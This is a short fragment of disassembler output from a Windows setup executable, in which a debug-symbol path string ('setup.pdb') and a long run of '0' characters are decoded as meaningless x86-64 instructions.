   14000bc51:	3a 5c 54 61          	cmp    0x61(%rsp,%rdx,2),%bl
   14000bc55:	72 67                	jb     0x14000bcbe
   14000bc57:	65 74 5c             	gs je  0x14000bcb6
   14000bc5a:	78 36                	js     0x14000bc92
   14000bc5c:	34 5c                	xor    $0x5c,%al
   14000bc5e:	73 68                	jae    0x14000bcc8
   14000bc60:	69 70 5c 73 65 74 75 	imul   $0x75746573,0x5c(%rax),%esi
   14000bc67:	70 65                	jo     0x14000bcce
   14000bc69:	78 65                	js     0x14000bcd0
   14000bc6b:	5c                   	pop    %rsp
   14000bc6c:	78 2d                	js     0x14000bc9b
   14000bc6e:	6e                   	outsb  (%rsi),(%dx)
   14000bc6f:	6f                   	outsl  (%rsi),(%dx)
   14000bc70:	6e                   	outsb  (%rsi),(%dx)
   14000bc71:	65 5c                	gs pop %rsp
   14000bc73:	73 65                	jae    0x14000bcda
   14000bc75:	74 75                	je     0x14000bcec
   14000bc77:	70 2e                	jo     0x14000bca7
   14000bc79:	70 64                	jo     0x14000bcdf
   14000bc7b:	62                   	(bad)
   14000bc7c:	00 74 75 70          	add    %dh,0x70(%rbp,%rsi,2)
   14000bc80:	2e 70 64             	jo,pn  0x14000bce7
   14000bc83:	62                   	(bad)
   14000bc84:	00 30                	add    %dh,(%rax)
   14000bc86:	30 30                	xor    %dh,(%rax)
   14000bc88:	30 30                	xor    %dh,(%rax)
   14000bc8a:	30 30                	xor    %dh,(%rax)
   14000bc8c:	30 30                	xor    %dh,(%rax)
   14000bc8e:	30 30                	xor    %dh,(%rax)
   14000bc90:	30 30                	xor    %dh,(%rax)
   14000bc92:	30 30                	xor    %dh,(%rax)
   14000bc94:	30 30                	xor    %dh,(%rax)
   14000bc96:	30 30                	xor    %dh,(%rax)
   14000bc98:	30 30                	xor    %dh,(%rax)
   14000bc9a:	30 30                	xor    %dh,(%rax)
   14000bc9c:	30 30                	xor    %dh,(%rax)
   14000bc9e:	30 30                	xor    %dh,(%rax)
   14000bca0:	30 30                	xor    %dh,(%rax)
   14000bca2:	30 30                	xor    %dh,(%rax)
   14000bca4:	30 30                	xor    %dh,(%rax)
   14000bca6:	30 30                	xor    %dh,(%rax)
   14000bca8:	30 30                	xor    %dh,(%rax)
   14000bcaa:	30 30                	xor    %dh,(%rax)
   14000bcac:	30 30                	xor    %dh,(%rax)
   14000bcae:	30 30                	xor    %dh,(%rax)
   14000bcb0:	30 30                	xor    %dh,(%rax)
   14000bcb2:	30 30                	xor    %dh,(%rax)
   14000bcb4:	30 30                	xor    %dh,(%rax)
   14000bcb6:	30 30                	xor    %dh,(%rax)
   14000bcb8:	30 30                	xor    %dh,(%rax)
   14000bcba:	30 30                	xor    %dh,(%rax)
   14000bcbc:	30 30                	xor    %dh,(%rax)
   14000bcbe:	30 30                	xor    %dh,(%rax)
   14000bcc0:	30 30                	xor    %dh,(%rax)
   14000bcc2:	30 30                	xor    %dh,(%rax)
   14000bcc4:	30 30                	xor    %dh,(%rax)
   14000bcc6:	30 30                	xor    %dh,(%rax)
   14000bcc8:	30 30                	xor    %dh,(%rax)
   14000bcca:	30 30                	xor    %dh,(%rax)
   14000bccc:	30 30                	xor    %dh,(%rax)
   14000bcce:	30 30                	xor    %dh,(%rax)
   14000bcd0:	30 30                	xor    %dh,(%rax)
   14000bcd2:	30 30                	xor    %dh,(%rax)
   14000bcd4:	30 30                	xor    %dh,(%rax)
   14000bcd6:	30 30                	xor    %dh,(%rax)
   14000bcd8:	30 30                	xor    %dh,(%rax)
   14000bcda:	30 30                	xor    %dh,(%rax)
   14000bcdc:	30 30                	xor    %dh,(%rax)
   14000bcde:	30 30                	xor    %dh,(%rax)
   14000bce0:	30 30                	xor    %dh,(%rax)
   14000bce2:	30 30                	xor    %dh,(%rax)
   14000bce4:	30 30                	xor    %dh,(%rax)
   14000bce6:	30 30                	xor    %dh,(%rax)
   14000bce8:	30 30                	xor    %dh,(%rax)
   14000bcea:	30 30                	xor    %dh,(%rax)
   14000bcec:	30 30                	xor    %dh,(%rax)
   14000bcee:	30 30                	xor    %dh,(%rax)
   14000bcf0:	30 30                	xor    %dh,(%rax)
   14000bcf2:	30 30                	xor    %dh,(%rax)
   14000bcf4:	30 30                	xor    %dh,(%rax)
   14000bcf6:	30 30                	xor    %dh,(%rax)
   14000bcf8:	30 30                	xor    %dh,(%rax)
   14000bcfa:	30 30                	xor    %dh,(%rax)
   14000bcfc:	30 30                	xor    %dh,(%rax)
   14000bcfe:	30 30                	xor    %dh,(%rax)
   14000bd00:	30 30                	xor    %dh,(%rax)
   14000bd02:	30 30                	xor    %dh,(%rax)
   14000bd04:	30 30                	xor    %dh,(%rax)
   14000bd06:	30 30                	xor    %dh,(%rax)
   14000bd08:	30 30                	xor    %dh,(%rax)
   14000bd0a:	30 30                	xor    %dh,(%rax)
   14000bd0c:	30 30                	xor    %dh,(%rax)
   14000bd0e:	30 30                	xor    %dh,(%rax)
   14000bd10:	30 30                	xor    %dh,(%rax)
   14000bd12:	30 30                	xor    %dh,(%rax)
   14000bd14:	30 30                	xor    %dh,(%rax)
   14000bd16:	30 30                	xor    %dh,(%rax)
   14000bd18:	30 30                	xor    %dh,(%rax)
   14000bd1a:	30 30                	xor    %dh,(%rax)
   14000bd1c:	30 30                	xor    %dh,(%rax)
   14000bd1e:	30 30                	xor    %dh,(%rax)
   14000bd20:	30 30                	xor    %dh,(%rax)
   14000bd22:	30 30                	xor    %dh,(%rax)
   14000bd24:	30 30                	xor    %dh,(%rax)
   14000bd26:	30 30                	xor    %dh,(%rax)
   14000bd28:	30 30                	xor    %dh,(%rax)
   14000bd2a:	30 30                	xor    %dh,(%rax)
   14000bd2c:	30 30                	xor    %dh,(%rax)
   14000bd2e:	30 30                	xor    %dh,(%rax)
   14000bd30:	30 30                	xor    %dh,(%rax)
   14000bd32:	30 30                	xor    %dh,(%rax)
   14000bd34:	30 30                	xor    %dh,(%rax)
   14000bd36:	30 30                	xor    %dh,(%rax)
   14000bd38:	30 30                	xor    %dh,(%rax)
   14000bd3a:	30 30                	xor    %dh,(%rax)
   14000bd3c:	30 30                	xor    %dh,(%rax)
   14000bd3e:	30 30                	xor    %dh,(%rax)
   14000bd40:	30 30                	xor    %dh,(%rax)
   14000bd42:	30 30                	xor    %dh,(%rax)
   14000bd44:	30 30                	xor    %dh,(%rax)
   14000bd46:	30 30                	xor    %dh,(%rax)
   14000bd48:	30 30                	xor    %dh,(%rax)
   14000bd4a:	30 30                	xor    %dh,(%rax)
   14000bd4c:	30 30                	xor    %dh,(%rax)
   14000bd4e:	30 00                	xor    %al,(%rax)
